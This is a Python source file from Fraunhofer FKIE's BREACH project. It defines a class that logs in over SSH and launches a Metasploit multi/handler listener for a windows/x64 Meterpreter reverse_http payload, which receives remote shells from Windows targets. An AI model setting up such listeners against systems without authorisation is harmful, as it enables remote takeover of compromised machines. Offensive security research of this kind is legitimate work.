# Copyright 2016, 2017, 2018, 2019 Fraunhofer FKIE
#
# This file is part of BREACH.
#
# BREACH is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# BREACH is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with BREACH. If not, see <http://www.gnu.org/licenses/>.


class ReverseConnectionHandler:
    handler_timeout = 330
    channel_timeout = 360

    def __init__(self, ssh_client, lhost, lport):
        self.ssh_client = ssh_client
        self.lhost = lhost
        self.lport = lport
        self.stdin = None
        self.stdout = None
        self.stderr = None

    def start(self):
        self.ssh_client.connect_to_target()
        self.stdin, self.stdout, self.stderr = self.ssh_client.exec_command(
            self._msf_command(), timeout=self.channel_timeout)

    def _msf_command(self):
        return (
            "msfconsole --exec-command "
            "\""
            "use exploit/multi/handler;"
            "set payload windows/x64/meterpreter/reverse_http;"
            "set lhost {lhost};"
            "set lport {lport};"
            "set ReverseListenerBindAddress {lhost};"
            "set ListenerTimeout {timeout};"
            "exploit;"
            "\"".format(lhost=self.lhost, lport=self.lport, timeout=self.handler_timeout))

    def shutdown(self):
        self.stdin.write("exit -y\n")
        self.ssh_client.close()
